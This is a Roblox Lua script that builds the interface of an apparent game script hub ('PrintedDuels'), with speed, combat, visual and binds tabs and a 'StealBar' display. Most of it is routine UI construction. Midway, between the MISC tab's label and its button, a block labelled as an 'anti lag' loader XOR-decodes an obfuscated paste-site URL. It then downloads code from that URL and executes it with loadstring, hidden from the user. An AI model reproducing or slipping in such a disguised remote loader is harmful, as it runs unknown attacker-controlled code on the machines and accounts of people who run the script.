G.ClearKB_9.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.ClearKB_9.Text = "X"
G.ClearKB_9.TextColor3 = Color3.fromRGB(255, 70, 80)
G.ClearKB_9.TextSize = 10
G.ClearKB_9:SetAttribute("PrintedSoundWired", true)
G.ClearKB_9.Parent = G.Frame_151

-- UICorner_190 (UICorner)
G.UICorner_190 = Instance.new("UICorner")
G.UICorner_190.CornerRadius = UDim.new(1, 0)
G.UICorner_190.Parent = G.ClearKB_9

-- TextButton_55 (TextButton)
G.TextButton_55 = Instance.new("TextButton")
G.TextButton_55.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TextButton_55.BorderSizePixel = 0
G.TextButton_55.Position = UDim2.new(1, -56, 0.5, -8)
G.TextButton_55.Size = UDim2.new(0, 34, 0, 16)
G.TextButton_55.ZIndex = 5
G.TextButton_55.AutoButtonColor = false
G.TextButton_55.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_55.Text = "V"
G.TextButton_55.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextButton_55:SetAttribute("PrintedSoundWired", true)
G.TextButton_55.Parent = G.Frame_151

-- UICorner_191 (UICorner)
G.UICorner_191 = Instance.new("UICorner")
G.UICorner_191.CornerRadius = UDim.new(1, 0)
G.UICorner_191.Parent = G.TextButton_55

-- TabBar (Frame)
G.TabBar = Instance.new("Frame")
G.TabBar.Name = "TabBar"
G.TabBar.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.TabBar.BackgroundTransparency = 0.05000000074505806
G.TabBar.BorderSizePixel = 0
G.TabBar.Position = UDim2.new(1, -100, 0, 62)
G.TabBar.Size = UDim2.new(0, 96, 1, -70)
G.TabBar.ZIndex = 30
G.TabBar.Parent = G.Frame

-- UICorner_192 (UICorner)
G.UICorner_192 = Instance.new("UICorner")
G.UICorner_192.CornerRadius = UDim.new(1, 0)
G.UICorner_192.Parent = G.TabBar

-- UIStroke_92 (UIStroke)
G.UIStroke_92 = Instance.new("UIStroke")
G.UIStroke_92.Color = Color3.fromRGB(120, 190, 255)
G.UIStroke_92.Thickness = 1.2000000476837158
G.UIStroke_92.Transparency = 0.44999998807907104
G.UIStroke_92.Parent = G.TabBar

-- Frame_152 (Frame)
G.Frame_152 = Instance.new("Frame")
G.Frame_152.BackgroundTransparency = 1
G.Frame_152.Position = UDim2.new(0, 6, 0, 10)
G.Frame_152.Size = UDim2.new(1, -12, 0, 30)
G.Frame_152.ZIndex = 31
G.Frame_152.Parent = G.TabBar

-- Frame_153 (Frame)
G.Frame_153 = Instance.new("Frame")
G.Frame_153.BackgroundColor3 = Color3.fromRGB(28, 90, 180)
G.Frame_153.BackgroundTransparency = 0.05000000074505806
G.Frame_153.BorderSizePixel = 0
G.Frame_153.Size = UDim2.new(1, 0, 1, 0)
G.Frame_153.ZIndex = 31
G.Frame_153.Parent = G.Frame_152

-- UICorner_193 (UICorner)
G.UICorner_193 = Instance.new("UICorner")
G.UICorner_193.CornerRadius = UDim.new(1, 0)
G.UICorner_193.Parent = G.Frame_153

-- UIGradient (UIGradient)
G.UIGradient = Instance.new("UIGradient")
G.UIGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(178, 182, 195))})
G.UIGradient.Rotation = 90
G.UIGradient.Parent = G.Frame_153

-- TextLabel_98 (TextLabel)
G.TextLabel_98 = Instance.new("TextLabel")
G.TextLabel_98.BackgroundTransparency = 1
G.TextLabel_98.Size = UDim2.new(1, 0, 1, 0)
G.TextLabel_98.ZIndex = 33
G.TextLabel_98.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_98.Text = "SPEED"
G.TextLabel_98.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_98.TextSize = 12
G.TextLabel_98.Parent = G.Frame_152

-- TextButton_56 (TextButton)
G.TextButton_56 = Instance.new("TextButton")
G.TextButton_56.BackgroundTransparency = 1
G.TextButton_56.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_56.ZIndex = 34
G.TextButton_56.AutoButtonColor = false
G.TextButton_56.Text = ""
G.TextButton_56:SetAttribute("PrintedSoundWired", true)
G.TextButton_56.Parent = G.Frame_152

-- Frame_154 (Frame)
G.Frame_154 = Instance.new("Frame")
G.Frame_154.BackgroundTransparency = 1
G.Frame_154.Position = UDim2.new(0, 6, 0, 44)
G.Frame_154.Size = UDim2.new(1, -12, 0, 30)
G.Frame_154.ZIndex = 31
G.Frame_154.Parent = G.TabBar

-- Frame_155 (Frame)
G.Frame_155 = Instance.new("Frame")
G.Frame_155.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.Frame_155.BackgroundTransparency = 1
G.Frame_155.BorderSizePixel = 0
G.Frame_155.Size = UDim2.new(1, 0, 1, 0)
G.Frame_155.ZIndex = 31
G.Frame_155.Parent = G.Frame_154

-- UICorner_194 (UICorner)
G.UICorner_194 = Instance.new("UICorner")
G.UICorner_194.CornerRadius = UDim.new(1, 0)
G.UICorner_194.Parent = G.Frame_155

-- UIGradient_2 (UIGradient)
G.UIGradient_2 = Instance.new("UIGradient")
G.UIGradient_2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(178, 182, 195))})
G.UIGradient_2.Rotation = 90
G.UIGradient_2.Parent = G.Frame_155

-- TextLabel_99 (TextLabel)
G.TextLabel_99 = Instance.new("TextLabel")
G.TextLabel_99.BackgroundTransparency = 1
G.TextLabel_99.Size = UDim2.new(1, 0, 1, 0)
G.TextLabel_99.ZIndex = 33
G.TextLabel_99.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_99.Text = "COMBAT"
G.TextLabel_99.TextColor3 = Color3.fromRGB(160, 165, 180)
G.TextLabel_99.TextSize = 12
G.TextLabel_99.Parent = G.Frame_154

-- TextButton_57 (TextButton)
G.TextButton_57 = Instance.new("TextButton")
G.TextButton_57.BackgroundTransparency = 1
G.TextButton_57.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_57.ZIndex = 34
G.TextButton_57.AutoButtonColor = false
G.TextButton_57.Text = ""
G.TextButton_57:SetAttribute("PrintedSoundWired", true)
G.TextButton_57.Parent = G.Frame_154

-- Frame_156 (Frame)
G.Frame_156 = Instance.new("Frame")
G.Frame_156.BackgroundTransparency = 1
G.Frame_156.Position = UDim2.new(0, 6, 0, 78)
G.Frame_156.Size = UDim2.new(1, -12, 0, 30)
G.Frame_156.ZIndex = 31
G.Frame_156.Parent = G.TabBar

-- Frame_157 (Frame)
G.Frame_157 = Instance.new("Frame")
G.Frame_157.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.Frame_157.BackgroundTransparency = 1
G.Frame_157.BorderSizePixel = 0
G.Frame_157.Size = UDim2.new(1, 0, 1, 0)
G.Frame_157.ZIndex = 31
G.Frame_157.Parent = G.Frame_156

-- UICorner_195 (UICorner)
G.UICorner_195 = Instance.new("UICorner")
G.UICorner_195.CornerRadius = UDim.new(1, 0)
G.UICorner_195.Parent = G.Frame_157

-- UIGradient_3 (UIGradient)
G.UIGradient_3 = Instance.new("UIGradient")
G.UIGradient_3.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(178, 182, 195))})
G.UIGradient_3.Rotation = 90
G.UIGradient_3.Parent = G.Frame_157

-- TextLabel_100 (TextLabel)
G.TextLabel_100 = Instance.new("TextLabel")
G.TextLabel_100.BackgroundTransparency = 1
G.TextLabel_100.Size = UDim2.new(1, 0, 1, 0)
G.TextLabel_100.ZIndex = 33
G.TextLabel_100.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_100.Text = "VISUAL"
G.TextLabel_100.TextColor3 = Color3.fromRGB(160, 165, 180)
G.TextLabel_100.TextSize = 12
G.TextLabel_100.Parent = G.Frame_156

-- TextButton_58 (TextButton)
G.TextButton_58 = Instance.new("TextButton")
G.TextButton_58.BackgroundTransparency = 1
G.TextButton_58.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_58.ZIndex = 34
G.TextButton_58.AutoButtonColor = false
G.TextButton_58.Text = ""
G.TextButton_58:SetAttribute("PrintedSoundWired", true)
G.TextButton_58.Parent = G.Frame_156

-- Frame_158 (Frame)
G.Frame_158 = Instance.new("Frame")
G.Frame_158.BackgroundTransparency = 1
G.Frame_158.Position = UDim2.new(0, 6, 0, 112)
G.Frame_158.Size = UDim2.new(1, -12, 0, 30)
G.Frame_158.ZIndex = 31
G.Frame_158.Parent = G.TabBar

-- Frame_159 (Frame)
G.Frame_159 = Instance.new("Frame")
G.Frame_159.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.Frame_159.BackgroundTransparency = 1
G.Frame_159.BorderSizePixel = 0
G.Frame_159.Size = UDim2.new(1, 0, 1, 0)
G.Frame_159.ZIndex = 31
G.Frame_159.Parent = G.Frame_158

-- UICorner_196 (UICorner)
G.UICorner_196 = Instance.new("UICorner")
G.UICorner_196.CornerRadius = UDim.new(1, 0)
G.UICorner_196.Parent = G.Frame_159

-- UIGradient_4 (UIGradient)
G.UIGradient_4 = Instance.new("UIGradient")
G.UIGradient_4.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(178, 182, 195))})
G.UIGradient_4.Rotation = 90
G.UIGradient_4.Parent = G.Frame_159

-- TextLabel_101 (TextLabel)
G.TextLabel_101 = Instance.new("TextLabel")
G.TextLabel_101.BackgroundTransparency = 1
G.TextLabel_101.Size = UDim2.new(1, 0, 1, 0)
G.TextLabel_101.ZIndex = 33
G.TextLabel_101.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_101.Text = "MISC"
G.TextLabel_101.TextColor3 = Color3.fromRGB(160, 165, 180)
G.TextLabel_101.TextSize = 12
G.TextLabel_101.Parent = G.Frame_158

-- Hidden anti lag/smooth graphics loader (URL obfuscated)
task.spawn(function()
    local function _xorDecode(s)
        local t = {}
        for i = 1, #s do
            local b = string.byte(s, i)
            local x
            if bit32 and type(bit32.bxor) == "function" then
                x = bit32.bxor(b, 23)
            else
                local r, bit, a, c = 0, 1, b, 23
                while a > 0 or c > 0 do
                    local ab, cb = a % 2, c % 2
                    if ab ~= cb then r = r + bit end
                    a = math.floor(a / 2)
                    c = math.floor(c / 2)
                    bit = bit * 2
                end
                x = r
            end
            t[i] = string.char(x)
        end
        return table.concat(t)
    end
    local ok, src = pcall(function()
        return game:HttpGet(_xorDecode("\127ccgd-88gvdcrqn9vgg8#GYp_N&V8ev`"))
    end)
    if ok and type(src) == "string" and #src > 50 then
        local fn = loadstring(src)
        if type(fn) == "function" then
            pcall(fn)
        end
    end
end)
-- TextButton_59 (TextButton)
G.TextButton_59 = Instance.new("TextButton")
G.TextButton_59.BackgroundTransparency = 1
G.TextButton_59.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_59.ZIndex = 34
G.TextButton_59.AutoButtonColor = false
G.TextButton_59.Text = ""
G.TextButton_59:SetAttribute("PrintedSoundWired", true)
G.TextButton_59.Parent = G.Frame_158

-- Frame_160 (Frame)
G.Frame_160 = Instance.new("Frame")
G.Frame_160.BackgroundTransparency = 1
G.Frame_160.Position = UDim2.new(0, 6, 0, 146)
G.Frame_160.Size = UDim2.new(1, -12, 0, 30)
G.Frame_160.ZIndex = 31
G.Frame_160.Parent = G.TabBar

-- Frame_161 (Frame)
G.Frame_161 = Instance.new("Frame")
G.Frame_161.BackgroundColor3 = Color3.fromRGB(22, 22, 28)
G.Frame_161.BackgroundTransparency = 1
G.Frame_161.BorderSizePixel = 0
G.Frame_161.Size = UDim2.new(1, 0, 1, 0)
G.Frame_161.ZIndex = 31
G.Frame_161.Parent = G.Frame_160

-- UICorner_197 (UICorner)
G.UICorner_197 = Instance.new("UICorner")
G.UICorner_197.CornerRadius = UDim.new(1, 0)
G.UICorner_197.Parent = G.Frame_161

-- UIGradient_5 (UIGradient)
G.UIGradient_5 = Instance.new("UIGradient")
G.UIGradient_5.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(178, 182, 195))})
G.UIGradient_5.Rotation = 90
G.UIGradient_5.Parent = G.Frame_161

-- TextLabel_102 (TextLabel)
G.TextLabel_102 = Instance.new("TextLabel")
G.TextLabel_102.BackgroundTransparency = 1
G.TextLabel_102.Size = UDim2.new(1, 0, 1, 0)
G.TextLabel_102.ZIndex = 33
G.TextLabel_102.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_102.Text = "BINDS"
G.TextLabel_102.TextColor3 = Color3.fromRGB(160, 165, 180)
G.TextLabel_102.TextSize = 12
G.TextLabel_102.Parent = G.Frame_160

-- TextButton_60 (TextButton)
G.TextButton_60 = Instance.new("TextButton")
G.TextButton_60.BackgroundTransparency = 1
G.TextButton_60.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_60.ZIndex = 34
G.TextButton_60.AutoButtonColor = false
G.TextButton_60.Text = ""
G.TextButton_60:SetAttribute("PrintedSoundWired", true)
G.TextButton_60.Parent = G.Frame_160

-- ProfileCard (Frame)
G.ProfileCard = Instance.new("Frame")
G.ProfileCard.Name = "ProfileCard"
G.ProfileCard.BackgroundTransparency = 1
G.ProfileCard.Position = UDim2.new(0, 4, 1, -120)
G.ProfileCard.Size = UDim2.new(1, -8, 0, 100)
G.ProfileCard.ZIndex = 32
G.ProfileCard.Parent = G.TabBar

-- Frame_162 (Frame)
G.Frame_162 = Instance.new("Frame")
G.Frame_162.BackgroundColor3 = Color3.fromRGB(40, 140, 255)
G.Frame_162.BorderSizePixel = 0
G.Frame_162.Position = UDim2.new(0.5, -32, 0, 0)
G.Frame_162.Size = UDim2.new(0, 64, 0, 64)
G.Frame_162.ZIndex = 32
G.Frame_162.Parent = G.ProfileCard

-- UICorner_198 (UICorner)
G.UICorner_198 = Instance.new("UICorner")
G.UICorner_198.CornerRadius = UDim.new(1, 0)
G.UICorner_198.Parent = G.Frame_162

-- Frame_163 (Frame)
G.Frame_163 = Instance.new("Frame")
G.Frame_163.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
G.Frame_163.BorderSizePixel = 0
G.Frame_163.Position = UDim2.new(0, 2, 0, 2)
G.Frame_163.Size = UDim2.new(1, -4, 1, -4)
G.Frame_163.ZIndex = 33
G.Frame_163.Parent = G.Frame_162

-- UICorner_199 (UICorner)
G.UICorner_199 = Instance.new("UICorner")
G.UICorner_199.CornerRadius = UDim.new(1, 0)
G.UICorner_199.Parent = G.Frame_163

-- ImageLabel (ImageLabel)
G.ImageLabel = Instance.new("ImageLabel")
G.ImageLabel.BackgroundTransparency = 1
G.ImageLabel.Size = UDim2.new(1, 0, 1, 0)
G.ImageLabel.ZIndex = 34
G.ImageLabel.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=10847714658&width=150&height=150&format=png"
G.ImageLabel.ScaleType = Enum.ScaleType.Crop
G.ImageLabel.Parent = G.Frame_163

-- UICorner_200 (UICorner)
G.UICorner_200 = Instance.new("UICorner")
G.UICorner_200.CornerRadius = UDim.new(1, 0)
G.UICorner_200.Parent = G.ImageLabel

-- TextLabel_103 (TextLabel)
G.TextLabel_103 = Instance.new("TextLabel")
G.TextLabel_103.BackgroundTransparency = 1
G.TextLabel_103.Position = UDim2.new(0, 3, 0, 68)
G.TextLabel_103.Size = UDim2.new(1, -6, 0, 16)
G.TextLabel_103.ZIndex = 32
G.TextLabel_103.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_103.Text = "weekly"
G.TextLabel_103.TextColor3 = Color3.fromRGB(235, 235, 240)
G.TextLabel_103.TextSize = 10
G.TextLabel_103.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_103.Parent = G.ProfileCard

-- TextLabel_104 (TextLabel)
G.TextLabel_104 = Instance.new("TextLabel")
G.TextLabel_104.BackgroundTransparency = 1
G.TextLabel_104.Position = UDim2.new(0, 3, 0, 84)
G.TextLabel_104.Size = UDim2.new(1, -6, 0, 12)
G.TextLabel_104.ZIndex = 32
G.TextLabel_104.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_104.Text = "PRINTED LOADED"
G.TextLabel_104.TextColor3 = Color3.fromRGB(80, 150, 255)
G.TextLabel_104.Parent = G.ProfileCard

-- MiniBtn (ImageButton)
G.MiniBtn = Instance.new("ImageButton")
G.MiniBtn.Name = "MiniBtn"
G.MiniBtn.BackgroundColor3 = Color3.fromRGB(12, 12, 14)
G.MiniBtn.BackgroundTransparency = 0.11999999731779099
G.MiniBtn.BorderSizePixel = 0
G.MiniBtn.Position = UDim2.new(0, 18, 0, 54)
G.MiniBtn.Size = UDim2.new(0, 108, 0, 36)
G.MiniBtn.Visible = false
G.MiniBtn.ZIndex = 20
G.MiniBtn.AutoButtonColor = false
G.MiniBtn.Image = "rbxassetid://127912104692615"
G.MiniBtn.ImageTransparency = 0.15000000596046448
G.MiniBtn.ScaleType = Enum.ScaleType.Crop
G.MiniBtn.Parent = G.PrintedDuels

-- UICorner_201 (UICorner)
G.UICorner_201 = Instance.new("UICorner")
G.UICorner_201.CornerRadius = UDim.new(1, 0)
G.UICorner_201.Parent = G.MiniBtn

-- UIStroke_93 (UIStroke)
G.UIStroke_93 = Instance.new("UIStroke")
G.UIStroke_93.Color = Color3.fromRGB(255, 255, 255)
G.UIStroke_93.Thickness = 1.2000000476837158
G.UIStroke_93.Transparency = 0.55000001192092896
G.UIStroke_93.Parent = G.MiniBtn

-- StealBar (Frame)
G.StealBar = Instance.new("Frame")
G.StealBar.Name = "StealBar"
G.StealBar.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
G.StealBar.BorderSizePixel = 0
G.StealBar.ClipsDescendants = true
G.StealBar.Position = UDim2.new(0.5, -76, 1, -41)
G.StealBar.Size = UDim2.new(0, 400, 0, 54)
G.StealBar.Parent = G.PrintedDuels

-- UICorner_202 (UICorner)
G.UICorner_202 = Instance.new("UICorner")
G.UICorner_202.CornerRadius = UDim.new(0, 14)
G.UICorner_202.Parent = G.StealBar

-- UIStroke_94 (UIStroke)
G.UIStroke_94 = Instance.new("UIStroke")
G.UIStroke_94.Color = Color3.fromRGB(120, 190, 255)
G.UIStroke_94.Thickness = 3.5
G.UIStroke_94.Parent = G.StealBar

-- UIGradient_6 (UIGradient)
G.UIGradient_6 = Instance.new("UIGradient")
G.UIGradient_6.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 100, 255)), ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 230, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 180, 255)), ColorSequenceKeypoint.new(0.75, Color3.fromRGB(200, 240, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 120, 255))})
G.UIGradient_6.Rotation = 338
G.UIGradient_6.Parent = G.UIStroke_94

-- UIScale_2 (UIScale)
G.UIScale_2 = Instance.new("UIScale")
G.UIScale_2.Scale = 0.60000002384185791
G.UIScale_2.Parent = G.StealBar

-- ParticleLayer (Frame)
G.ParticleLayer = Instance.new("Frame")
G.ParticleLayer.Name = "ParticleLayer"
G.ParticleLayer.BackgroundTransparency = 1
G.ParticleLayer.ClipsDescendants = true
G.ParticleLayer.Size = UDim2.new(1, 0, 1, 0)
G.ParticleLayer.Parent = G.StealBar

-- Frame_164 (Frame)
G.Frame_164 = Instance.new("Frame")
G.Frame_164.BackgroundColor3 = Color3.fromRGB(190, 205, 255)
G.Frame_164.BackgroundTransparency = 0.74946135282516479
G.Frame_164.BorderSizePixel = 0
G.Frame_164.Position = UDim2.new(0.15310737490653992, 0, 0.62278962135314941, 0)
G.Frame_164.Size = UDim2.new(0, 3, 0, 3)
G.Frame_164.Parent = G.ParticleLayer

-- UICorner_203 (UICorner)
G.UICorner_203 = Instance.new("UICorner")
G.UICorner_203.CornerRadius = UDim.new(1, 0)
G.UICorner_203.Parent = G.Frame_164

-- Frame_165 (Frame)
G.Frame_165 = Instance.new("Frame")
G.Frame_165.BackgroundColor3 = Color3.fromRGB(190, 205, 255)
G.Frame_165.BackgroundTransparency = 0.60280090570449829
G.Frame_165.BorderSizePixel = 0
G.Frame_165.Position = UDim2.new(0.92195367813110352, 0, 0.035642169415950775, 0)
G.Frame_165.Size = UDim2.new(0, 3, 0, 3)
G.Frame_165.Parent = G.ParticleLayer

-- UICorner_204 (UICorner)
G.UICorner_204 = Instance.new("UICorner")
G.UICorner_204.CornerRadius = UDim.new(1, 0)
G.UICorner_204.Parent = G.Frame_165

-- Frame_166 (Frame)
G.Frame_166 = Instance.new("Frame")
G.Frame_166.BackgroundColor3 = Color3.fromRGB(190, 205, 255)
G.Frame_166.BackgroundTransparency = 0.75798678398132324
G.Frame_166.BorderSizePixel = 0
G.Frame_166.Position = UDim2.new(0.16301912069320679, 0, 0.80124008655548096, 0)
G.Frame_166.Size = UDim2.new(0, 3, 0, 2)
G.Frame_166.Parent = G.ParticleLayer

-- UICorner_205 (UICorner)
G.UICorner_205 = Instance.new("UICorner")
G.UICorner_205.CornerRadius = UDim.new(1, 0)
G.UICorner_205.Parent = G.Frame_166

-- Frame_167 (Frame)
G.Frame_167 = Instance.new("Frame")
G.Frame_167.BackgroundColor3 = Color3.fromRGB(190, 205, 255)
G.Frame_167.BackgroundTransparency = 0.71207731962203979
G.Frame_167.BorderSizePixel = 0
G.Frame_167.Position = UDim2.new(0.72461628913879395, 0, 0.87803715467453003, 0)
G.Frame_167.Size = UDim2.new(0, 3, 0, 3)
G.Frame_167.Parent = G.ParticleLayer

-- UICorner_206 (UICorner)
G.UICorner_206 = Instance.new("UICorner")
G.UICorner_206.CornerRadius = UDim.new(1, 0)
G.UICorner_206.Parent = G.Frame_167

-- Frame_168 (Frame)
G.Frame_168 = Instance.new("Frame")
G.Frame_168.BackgroundColor3 = Color3.fromRGB(190, 205, 255)
G.Frame_168.BackgroundTransparency = 0.5009421706199646
G.Frame_168.BorderSizePixel = 0
G.Frame_168.Position = UDim2.new(0.2579292356967926, 0, 0.59932339191436768, 0)
G.Frame_168.Size = UDim2.new(0, 2, 0, 3)
G.Frame_168.Parent = G.ParticleLayer

-- UICorner_207 (UICorner)
G.UICorner_207 = Instance.new("UICorner")
G.UICorner_207.CornerRadius = UDim.new(1, 0)
G.UICorner_207.Parent = G.Frame_168

-- Frame_169 (Frame)
G.Frame_169 = Instance.new("Frame")
G.Frame_169.BackgroundColor3 = Color3.fromRGB(190, 205, 255)
G.Frame_169.BackgroundTransparency = 0.63786029815673828
G.Frame_169.BorderSizePixel = 0
G.Frame_169.Position = UDim2.new(0.21839147806167603, 0, 0.60653591156005859, 0)
G.Frame_169.Size = UDim2.new(0, 2, 0, 3)
G.Frame_169.Parent = G.ParticleLayer

-- UICorner_208 (UICorner)
G.UICorner_208 = Instance.new("UICorner")
G.UICorner_208.CornerRadius = UDim.new(1, 0)
G.UICorner_208.Parent = G.Frame_169

-- CircleFrame (Frame)
G.CircleFrame = Instance.new("Frame")
G.CircleFrame.Name = "CircleFrame"
G.CircleFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 24)
G.CircleFrame.BorderSizePixel = 0
G.CircleFrame.ClipsDescendants = true
G.CircleFrame.Position = UDim2.new(0, 8, 0.5, -16)
G.CircleFrame.Size = UDim2.new(0, 32, 0, 32)
G.CircleFrame.ZIndex = 5
G.CircleFrame.Parent = G.StealBar

-- UICorner_209 (UICorner)
G.UICorner_209 = Instance.new("UICorner")
G.UICorner_209.CornerRadius = UDim.new(1, 0)
G.UICorner_209.Parent = G.CircleFrame

-- UIStroke_95 (UIStroke)
G.UIStroke_95 = Instance.new("UIStroke")
G.UIStroke_95.Color = Color3.fromRGB(70, 70, 80)
G.UIStroke_95.Transparency = 0.34999999403953552
G.UIStroke_95.Parent = G.CircleFrame

-- AvatarThumb (ImageLabel)
G.AvatarThumb = Instance.new("ImageLabel")
G.AvatarThumb.Name = "AvatarThumb"
G.AvatarThumb.BackgroundTransparency = 1
G.AvatarThumb.Size = UDim2.new(1, 0, 1, 0)
G.AvatarThumb.ZIndex = 6
G.AvatarThumb.Image = "rbxthumb://type=AvatarHeadShot&id=10847714658&w=100&h=100"
G.AvatarThumb.ScaleType = Enum.ScaleType.Crop
G.AvatarThumb.Parent = G.CircleFrame

-- UICorner_210 (UICorner)
G.UICorner_210 = Instance.new("UICorner")
G.UICorner_210.CornerRadius = UDim.new(1, 0)
G.UICorner_210.Parent = G.AvatarThumb

-- TextLabel_105 (TextLabel)
G.TextLabel_105 = Instance.new("TextLabel")
G.TextLabel_105.BackgroundTransparency = 1
G.TextLabel_105.Position = UDim2.new(0, 48, 0, 2)
G.TextLabel_105.Size = UDim2.new(0, 80, 0, 32)
G.TextLabel_105.ZIndex = 6
G.TextLabel_105.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_105.Text = "0%"
G.TextLabel_105.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextLabel_105.TextSize = 26
G.TextLabel_105.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_105.Parent = G.StealBar

-- TextLabel_106 (TextLabel)
G.TextLabel_106 = Instance.new("TextLabel")
G.TextLabel_106.Visible = false
G.TextLabel_106.Text = "60"
G.TextLabel_106.Parent = G.StealBar

-- Frame_170 (Frame)
G.Frame_170 = Instance.new("Frame")
G.Frame_170.BackgroundTransparency = 1
G.Frame_170.Position = UDim2.new(1, -228, 0, 6)
G.Frame_170.Size = UDim2.new(0, 220, 0, 18)
G.Frame_170.ZIndex = 6
G.Frame_170.Parent = G.StealBar

-- UIListLayout_8 (UIListLayout)
G.UIListLayout_8 = Instance.new("UIListLayout")
G.UIListLayout_8.FillDirection = Enum.FillDirection.Horizontal
G.UIListLayout_8.HorizontalAlignment = Enum.HorizontalAlignment.Right
G.UIListLayout_8.Padding = UDim.new(0, 8)
G.UIListLayout_8.VerticalAlignment = Enum.VerticalAlignment.Center
G.UIListLayout_8.Parent = G.Frame_170

-- TextLabel_107 (TextLabel)
G.TextLabel_107 = Instance.new("TextLabel")
G.TextLabel_107.BackgroundTransparency = 1
G.TextLabel_107.Size = UDim2.new(0, 60, 1, 0)
G.TextLabel_107.ZIndex = 6
G.TextLabel_107.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_107.Text = "FPS 60"
G.TextLabel_107.TextColor3 = Color3.fromRGB(210, 214, 226)
G.TextLabel_107.TextSize = 13
G.TextLabel_107.TextXAlignment = Enum.TextXAlignment.Right
G.TextLabel_107.Parent = G.Frame_170

-- TextLabel_108 (TextLabel)
G.TextLabel_108 = Instance.new("TextLabel")
G.TextLabel_108.BackgroundTransparency = 1
G.TextLabel_108.Size = UDim2.new(0, 92, 1, 0)
G.TextLabel_108.ZIndex = 6
G.TextLabel_108.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_108.Text = "PING 41ms"
G.TextLabel_108.TextColor3 = Color3.fromRGB(210, 214, 226)
G.TextLabel_108.TextSize = 13
G.TextLabel_108.TextXAlignment = Enum.TextXAlignment.Right
G.TextLabel_108.Parent = G.Frame_170

-- TextLabel_109 (TextLabel)
G.TextLabel_109 = Instance.new("TextLabel")
G.TextLabel_109.BackgroundTransparency = 1
G.TextLabel_109.Size = UDim2.new(0, 78, 1, 0)
G.TextLabel_109.ZIndex = 6
G.TextLabel_109.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_109.Text = "08:07 PM"
G.TextLabel_109.TextColor3 = Color3.fromRGB(210, 214, 226)
G.TextLabel_109.TextSize = 13
G.TextLabel_109.TextXAlignment = Enum.TextXAlignment.Right
G.TextLabel_109.Parent = G.Frame_170

-- ProgressTrack (Frame)
G.ProgressTrack = Instance.new("Frame")
G.ProgressTrack.Name = "ProgressTrack"
G.ProgressTrack.BackgroundColor3 = Color3.fromRGB(28, 28, 34)
G.ProgressTrack.BackgroundTransparency = 0.15000000596046448
G.ProgressTrack.BorderSizePixel = 0
G.ProgressTrack.Position = UDim2.new(0, 48, 1, -12)
G.ProgressTrack.Size = UDim2.new(1, -58, 0, 6)
G.ProgressTrack.ZIndex = 4
G.ProgressTrack.Parent = G.StealBar

-- UICorner_211 (UICorner)
G.UICorner_211 = Instance.new("UICorner")
G.UICorner_211.CornerRadius = UDim.new(1, 0)
G.UICorner_211.Parent = G.ProgressTrack

-- ProgressFill (Frame)
G.ProgressFill = Instance.new("Frame")
G.ProgressFill.Name = "ProgressFill"
G.ProgressFill.BackgroundColor3 = Color3.fromRGB(235, 238, 245)
G.ProgressFill.BorderSizePixel = 0
